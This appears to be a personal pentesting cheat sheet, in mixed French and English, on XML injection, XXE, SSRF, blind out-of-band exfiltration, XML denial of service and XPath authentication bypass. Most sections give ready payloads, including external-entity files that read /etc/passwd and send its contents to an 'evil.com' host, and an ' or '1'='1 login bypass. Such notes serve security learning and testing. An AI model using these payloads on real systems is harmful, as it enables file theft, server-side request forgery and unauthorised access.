# XXE and other XML vulnerabilities

## XML injection

Si nos inputs sont directement ajouter en tant que noeud dans un doc xml :

* We can inject malformed string to break the parser
* On peut modifier les informations enregistrées. Par exemple si notre input consiste en notre nom et que l'app rajoute ensuite automatiquement un champ pour nos droits, on peut fabriquer notre input de force à commenter la partie générée par l'appli et à la place mettre la notre \(owasp testing guide 4 page 138 pour un exemple\).
* If the xml is converted to html, `<![CDATA[]]>` might just be stripped, making it possible to inject other script undectected

```text
<html>
 <![CDATA[<]]>script<![CDATA[>]]>alert(‘xss’)<![CDATA[<]]>/
script<![CDATA[>]]>
 </html>
<!-- to : -->
<script>alert(‘XSS’)</script>
```

## XXE - _XML External Entities_

### Inband

Si le site nous renvoit directement ce qui a été parsé, on peut envoyer ce genre de fichier :

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE inband [
    <!ELEMENT inband ANY>
    <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<inband>&xxe;</inband>
```

### SSRF - _Server Side Request Forgery_

On peut faire n'importe quelle requête _au nom du serveur_ en lui faisant suivre un lien pour load un DTD externe :

```markup
<?xml version="1.0"?>
<!DOCTYPE ssrf [
    <!ENTITY request SYSTEM "http://attacker.com">
]>
<ssrf>&request;</ssrf>
```

### Out-of-band \(blind\)

Pour "exfilter" les données au cas où elles ne nous sont pas montrées, on peut forcer le serveur à faire une requête vers notre serveur avec dans le lien les données.

```markup
<!-- test.xml-->
<?xml version="1.0" encoding="UTF-8 ?>
<!DOCTYPE test SYSTEM "http://evil.com/external.dtd">
<test>&send;</test>

<!-- external.dtd -->
    <!ENTITY % file_content SYSTEM "/etc/passwd">
    <!ENTITY % wrapper "<!ENTITY send 'http://evil.com/?%file_content;'>">
    %wrapper;
```

Au cas où le contenu du fichier ferait bugger le parser, on peut abuser de _CDTATA_ :

```markup
<!-- test.xml-->
<?xml version="1.0" encoding="UTF-8 ?>
<!DOCTYPE test SYSTEM "http://evil.com/external.dtd">
<test>&send;</test>

<!-- external.dtd -->
    <!ENTITY % file_content SYSTEM "/etc/passwd">
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % end "]]>">
    <!ENTITY % wrapper "<!ENTITY send 'http://evil.com/?%start;%file_content;%end;'>">
    %wrapper;
```

### DDOS

By doing this kind of request we can DDOS

```markup
<?xml version=”1.0” encoding=”ISO-8859-1”?>
 <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM “file:///dev/random” >
]>
<foo>&xxe;</foo>
```

See also "A Billion Laugh" attack

### Ressources supplémentaires

* [https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/) 
* [https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

## XPath Injection

Elles suivent la même logique que les injections SQL.

```text
Cette requête récupère le compte correspondant à "gandalf" avec le mdp "!3c"

string(//user[username/text()=’gandalf’ and password/text()=’!c3’]/account/text())

En insérant ces valeurs :
Username: ‘ or ‘1’ = ‘1
Password: ‘ or ‘1’ = ‘1 

Elle deviendrait cela :
string(//user[username/text()=’’ or ‘1’ = ‘1’ and password/
text()=’’ or ‘1’ = ‘1’]/account/text())
```

Nous permettant de nous authentifier systématiquement.

J'imagine que le même genre de chose est possible avec XQuery.

